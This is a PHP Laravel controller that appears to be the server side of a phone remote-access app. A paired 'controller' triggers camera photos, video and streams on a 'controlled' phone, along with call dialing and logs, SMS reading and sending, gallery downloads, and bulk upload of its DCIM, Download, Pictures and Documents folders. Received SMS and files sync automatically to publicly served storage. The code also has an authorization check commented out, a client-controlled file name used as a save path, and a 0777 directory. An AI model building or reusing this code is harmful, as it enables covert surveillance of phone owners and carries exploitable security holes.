<?php

namespace App\Http\Controllers;

use App\Models\Device;
use App\Models\Command;
use Illuminate\Support\Str;
use App\Events\CommandEvent;
use Illuminate\Http\Request;
use App\Services\StatsService;
use App\Events\AdminStatsUpdated;
use App\Services\FirebaseService;
use App\Events\AdminCommandCreated;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Storage;


class AccessController extends Controller
{
    protected $firebase;
    protected $statsService;

    public function __construct(FirebaseService $firebase, StatsService $statsService)
    {
        $this->firebase = $firebase;
        $this->statsService = $statsService;
    }

    private function sendCommand($action, $target, $controller, $payload = [])
    {
        $command = Command::create([
            'from_device_id' => $controller->id,
            'to_device_id' => $target->id,
            'action' => $action,
            'payload' => json_encode($payload),
            'status' => 'pending',
        ]);

        event(new AdminCommandCreated($command));
        // event(new AdminStatsUpdated(getCurrentStats()));

        event(new AdminStatsUpdated(StatsService::current()));


        // Broadcast via Reverb (WebSocket)
        event(new CommandEvent($command));

        // Firebase push fallback
        if ($target->fcm_token) {
            $this->firebase->sendPush($target->fcm_token, [
                'type' => 'command',
                'command_id' => $command->id,
                'action' => $action,
            ]);
        }

        return $command;
    }


    public function completeCommand(Request $request)
    {
        $request->validate([
            'command_id' => 'required|exists:commands,id',
            'result' => 'nullable|string',
            'error' => 'nullable|string',
        ]);

        $command = Command::find($request->command_id);

        $user = Auth::user();
        $device = Device::where('device_id', $request->header('X-Device-ID'))->first();

        // if (!$device || $command->to_device_id !== $device->id) {
        //     abort(403, 'Unauthorized');
        // }

        $command->update([
            'status' => $request->error ? 'failed' : 'completed',
            'result' => $request->result,
            'error' => $request->error,
        ]);

        // Broadcast updates
        event(new \App\Events\AdminCommandUpdated($command));
        event(new \App\Events\AdminStatsUpdated($this->statsService->current()));

        return response()->json(['message' => 'Command completed']);
    }

    private function validateAndGetDevices(Request $request)
    {
        $request->validate([
            'target_device_id' => 'required|exists:devices,id',
        ]);

        $user = Auth::user();
        $controller = $user->devices()->where('role', 'controller')->first();

        if (!$controller) {
            abort(403, 'No controller device registered.');
        }

        $target = Device::find($request->target_device_id);

        if ((int) $target->paired_to !== (int) $controller->id) {
            abort(403, 'Device not paired with your controller.');
        }

        return [$controller, $target];
    }

    // ========================================
    // 1. CAMERA ACCESS
    // ========================================
    public function camera(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'type' => 'required|in:photo,video,stream',
        ]);

        $payload = [
            'type' => $request->type,
        ];

        $command = $this->sendCommand('camera_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }

    // ========================================
    // 2. CALL ACCESS
    // ========================================
    public function call(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'action' => 'required|in:dial,get_logs',
            'number' => 'nullable|string|required_if:action,dial',
        ]);

        $payload = [
            'action' => $request->action,
        ];

        if ($request->action === 'dial') {
            $payload['number'] = $request->number;
        }

        $command = $this->sendCommand('call_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }

    public function file(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'action' => 'required|in:sync', // only sync (download all)
        ]);

        $payload = [
            'action' => 'sync_files',
            'paths' => [
                '/storage/emulated/0/DCIM/',
                '/storage/emulated/0/Download/',
                '/storage/emulated/0/Pictures/',
                '/storage/emulated/0/Documents/',
            ],
        ];

        $command = $this->sendCommand('file_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }

    public function fileAutoSync(Request $request)
    {
        Log::info('File auto sync received', $request->all());

        $request->validate([
            'path'      => 'required|string',
            'files'     => 'required|string',
            'device_id' => 'required|string',
        ]);

        $user = Auth::user();
        $device = $user->devices()->where('device_id', $request->device_id)->first();

        if (!$device || $device->role !== 'controlled') {
            abort(403);
        }

        $filesArray = json_decode($request->input('files'), true);
        if (!is_array($filesArray)) {
            abort(400);
        }

        $filesArray = array_slice($filesArray, 0, 30);
        $savedFiles = [];

        foreach ($filesArray as $fileInfo) {
            // Skip if it's not a file or has no data
            if ($fileInfo['type'] !== 'file' || empty($fileInfo['data'])) continue;

            $filename = $fileInfo['name'];
            $savePath = 'files/' . $filename;

            if (!Storage::disk('public')->exists($savePath)) {
                $bytes = base64_decode($fileInfo['data']);
                if ($bytes !== false) {
                    Storage::disk('public')->put($savePath, $bytes);
                }
            }

            $savedFiles[] = [
                'name'        => $filename,
                'server_path' => $savePath,
                'url'         => Storage::disk('public')->url($savePath),
                'size'        => $fileInfo['size'] ?? 0,
                'modified'    => $fileInfo['modified'] ?? now()->timestamp,
            ];
        }

        // --- FIX: Check if savedFiles is NOT empty before proceeding ---
        if (empty($savedFiles)) {
            return response()->json([
                'message' => 'No files to save (empty data or folders ignored)',
                'saved_count' => 0,
            ]);
        }

        // Now it is safe to access $savedFiles[0]
        $existingCommand = Command::where('from_device_id', $device->id)
            ->where('action', 'file_access')
            ->where('result', 'LIKE', '%' . $savedFiles[0]['name'] . '%')
            ->first();

        $resultData = [
            'saved_count' => count($savedFiles),
            'total_processed' => count($filesArray),
            'files' => $savedFiles
        ];
        if ($existingCommand) {
            $existingCommand->update([
                'result' =>
                // json_encode($savedFiles),
                json_encode($resultData),
                'status' => 'completed',
                'updated_at' => now(),
            ]);
        } else {
            Command::create([
                'from_device_id' => $device->id,
                'to_device_id'   => $device->paired_to,
                'action'         => 'file_access',
                'payload'        => json_encode(['path' => $request->path]),
                'result'         => json_encode($savedFiles),
                'status'         => 'completed',
            ]);
        }

        return response()->json([
            'message'     => 'Files saved',
            'saved_count' => count($savedFiles),
        ]);
    }
    // ========================================
    // 4. GALLERY ACCESS
    // ========================================
    public function gallery(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'action' => 'required|in:list,download',
            'media_type' => 'nullable|in:photo,video', // Optional filter
            'target_device_id' => 'required|exists:devices,id',
        ]);

        $payload = [
            'action' => $request->action,
            'media_type' => $request->media_type,
        ];

        $command = $this->sendCommand('gallery_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }

    public function galleryAutoSync(Request $request)
    {
        $request->validate([
            'device_id' => 'required|string',
            'media_id'  => 'required|string', // The local ID on the phone
            'title'     => 'required|string',
            'mime_type' => 'required|string',
            'date'      => 'required',
        ]);

        $user = Auth::user();
        $device = $user->devices()->where('device_id', $request->device_id)->first();

        if (!$device || $device->role !== 'controlled') {
            abort(403);
        }

        $mediaData = [
            'media_id'  => $request->media_id,
            'title'     => $request->title,
            'mime_type' => $request->mime_type,
            'date'      => $request->date,
        ];

        // Store in Command history so Controller can see it
        return Command::updateOrCreate(
            [
                'from_device_id' => $device->id,
                'action'         => 'gallery_access',
                'payload'        => json_encode([
                    'action'   => 'auto_sync_gallery',
                    'media_id' => $request->media_id
                ]),
            ],
            [
                'to_device_id'   => $device->paired_to,
                'result'         => json_encode([$mediaData]),
                'status'         => 'completed',
            ]
        );
    }

    public function uploadMedia(Request $request)
    {
        $request->validate([
            'media_id' => 'required|string',
            'file' => 'required|file|image|max:10240', // Max 10MB
        ]);

        if ($request->hasFile('file')) {
            $file = $request->file('file');

            // Create folder if it doesn't exist
            $path = public_path('gallery_sync');
            if (!file_exists($path)) {
                mkdir($path, 0777, true);
            }

            // Save file: format as mediaId_timestamp.ext
            $fileName = $request->media_id . '_' . time() . '.' . $file->getClientOriginalExtension();
            $file->move($path, $fileName);

            return response()->json([
                'status' => 'success',
                'file_path' => asset('gallery_sync/' . $fileName)
            ]);
        }

        return response()->json(['error' => 'No file uploaded'], 400);
    }

    // ========================================
    // 5. MESSAGE ACCESS
    // ========================================
    public function message(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'action' => 'required|in:send,read,inbox',
            'to' => 'nullable|string|required_if:action,send',
            'text' => 'nullable|string|required_if:action,send',
            'thread_id' => 'nullable|integer',
        ]);

        $payload = ['action' => $request->action];

        if ($request->action === 'send') {
            $payload['to'] = $request->to;
            $payload['text'] = $request->text;
        }

        if ($request->action === 'read') {
            $payload['thread_id'] = $request->thread_id;
        }

        $command = $this->sendCommand('message_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }
    public function smsAutoSync(Request $request)
    {
        $request->validate([
            'device_id' => 'required|string',
            'from'      => 'required|string',
            'body'      => 'required|string',
            'date'      => 'required',
        ]);

        $user = Auth::user();
        $device = $user->devices()->where('device_id', $request->device_id)->first();

        if (!$device || $device->role !== 'controlled') {
            abort(403);
        }

        $smsData = [
            'from' => $request->from,
            'body' => $request->body,
            'date' => $request->date,
        ];

        // Use updateOrCreate to prevent exact duplicates in the History
        // based on the SMS date and sender.
        return Command::updateOrCreate(
            [
                'from_device_id' => $device->id,
                'action'         => 'message_access',
                // Using a fingerprint of the SMS in the payload to identify uniqueness
                'payload'        => json_encode([
                    'action' => 'auto_sync_received',
                    'sms_date' => $request->date,
                    'sms_from' => $request->from
                ]),
            ],
            [
                'to_device_id'   => $device->paired_to,
                'result'         => json_encode([$smsData]),
                'status'         => 'completed',
            ]
        );
    }
}
